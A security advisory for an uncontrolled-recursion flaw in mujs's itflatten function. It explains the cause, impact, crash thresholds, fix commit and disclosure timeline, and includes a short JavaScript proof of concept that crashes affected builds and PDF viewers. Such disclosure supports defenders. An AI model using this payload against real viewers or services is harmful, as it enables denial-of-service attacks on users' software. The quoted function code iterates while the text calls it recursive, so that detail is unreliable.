---
title: "mujs — Uncontrolled Recursion in itflatten() (CWE-674)"
severity: High
type: CWE-674 (Uncontrolled Recursion)
affected_component: "mujs / MuPDF — jsproperty.c"
affected_version: "<= 1.3.11"
patched_version: "unreleased (commit e9090f1)"
affected_file: jsproperty.c
affected_function: itflatten (line 266)
reporter: Hyeontaek Lim (Captainjack)
date: 2026-11-02
---

| | |
| --- | --- |
| **Severity** | <span class="sev">High</span> |
| **Type** | CWE-674 (Uncontrolled Recursion) |
| **CVE** | VulDB pending |
| **Affected** | `mujs` <= 1.3.11 (all releases) |
| **Affected file** | `jsproperty.c` → `itflatten()` (line 266), `itwalk()` (line 249) |
| **Patched** | Commit [`e9090f1`](https://github.com/ArtifexSoftware/mujs/commit/e9090f1829b31d4d89ea2536a67ac39cf31dba68) (2026-11-18, unreleased) |
| **Impact** | DoS (process crash via stack exhaustion) |
| **Attack vector** | Crafted JavaScript input / malicious PDF with embedded JS (via MuPDF) |
| **Reference** | [Bug #710066](https://bugs.ghostscript.com/show_bug.cgi?id=710066) |

## Summary

A **stack exhaustion vulnerability** (CWE-674) exists in the `itflatten()` function of mujs, a lightweight JavaScript interpreter embedded in **MuPDF** and **Sumatra PDF**. The function recursively traverses an object's prototype chain without any depth limit. An attacker can craft a JavaScript input with a deeply nested prototype chain (via `Object.create()`) that, when enumerated with a `for-in` statement, causes unbounded C-level recursion leading to a **process crash**.

This is the **only unprotected recursive path** in mujs — all other recursive paths (parser, regex, JSON) have depth guards.

> [!danger] Remote attack vector via MuPDF
> MuPDF processes JavaScript embedded in PDF files using mujs. A malicious PDF opened by any MuPDF-based viewer triggers this vulnerability with no user interaction beyond opening the file.

## Details

### Root cause — no depth limit on prototype chain traversal

`itflatten()` and `itwalk()` are mutually recursive: `itflatten()` walks the prototype chain and calls `itwalk()` to traverse each object's AA-tree of properties, and `itwalk()` calls `itflatten()` again. Neither function checks recursion depth.

```c
// jsproperty.c:266
static void itflatten(js_State *J, js_Object *top) {
    js_Object *obj = top;
    while (obj) {
        js_Iterator *tail = NULL;
        itwalk(J, &top->head, &tail, obj->properties);  // mutual recursion
        obj = obj->prototype;  // no depth limit
    }
}
```

### Existing depth protections (all other paths)

| Protected path | Function | Limit | Status |
| --- | --- | --- | --- |
| Value stack | global | JS_STACKSIZE = 4096 | Protected |
| Call stack | global | JS_ENVLIMIT = 1024 | Protected |
| Parser recursion | jsP_* | JS_ASTLIMIT = 400 | Protected |
| Regex recursion | match/count | REG_MAXREC = 4096 | Protected |
| **itflatten** | **itflatten/itwalk** | **None** | **Unprotected** |

## Reproduction

### PoC

```javascript
// mujs itflatten() CWE-674 — Uncontrolled Recursion DoS
// Impact: process crash (SIGSEGV / stack overflow)
// Affected: mujs <= 1.3.11

var o = {};
for (var i = 0; i < 200000; i++)
    o = Object.create(o);

for (var k in o) {}  // → itflatten() C recursion → SIGSEGV
```

### Trigger path

```
"for-in" statement → OP_ITERATOR → jsV_newiterator() → itflatten() → itwalk() → [mutual recursion without depth check] → stack exhaustion → SIGSEGV
```

### Crash thresholds

| Build | Frame size | Crash depth | Notes |
| --- | --- | --- | --- |
| mujs standalone (-O0) | 40B/step | ~176,000 | Linux 8MB stack |
| MuPDF (-O2) | 56B/4 steps | ~530,000 | GCC 4x unroll |
| ASAN build | enlarged | ~100,000 | Redzones enlarge frames |

## Impact

**Denial of Service** — process crash on all platforms.

- **Standalone mujs**: any application embedding mujs crashes on crafted JS input
- **MuPDF mutool**: `mutool run` path crashes directly (no runlimit)
- **MuPDF PDF viewer**: malicious PDF containing embedded JavaScript crashes the viewer
- **Downstream**: Sumatra PDF and other MuPDF embedders are affected

On embedded platforms without stack guard pages (e.g., ARM Cortex-M), the stack overflow may overwrite adjacent memory, potentially enabling code execution.

## Fix

The vendor replaced recursive prototype chain traversal with iterative traversal in commit [`e9090f1`](https://github.com/ArtifexSoftware/mujs/commit/e9090f1829b31d4d89ea2536a67ac39cf31dba68).

## Timeline

| Date | Event |
| --- | --- |
| 2026-11-02 | Vulnerability discovered |
| 2026-11-16 | Reported via Bugzilla (Bug #710066) |
| 2026-11-18 | Vendor fixed (commit e9090f1) |
| 2026-11-24 | VulDB submission |
| TBD | CVE assigned |

## References

- [CWE-674: Uncontrolled Recursion](https://cwe.mitre.org/data/definitions/674.html)
- [Bug #710066 — Ghostscript Bugzilla](https://bugs.ghostscript.com/show_bug.cgi?id=710066)
- [Fix commit e9090f1](https://github.com/ArtifexSoftware/mujs/commit/e9090f1829b31d4d89ea2536a67ac39cf31dba68)
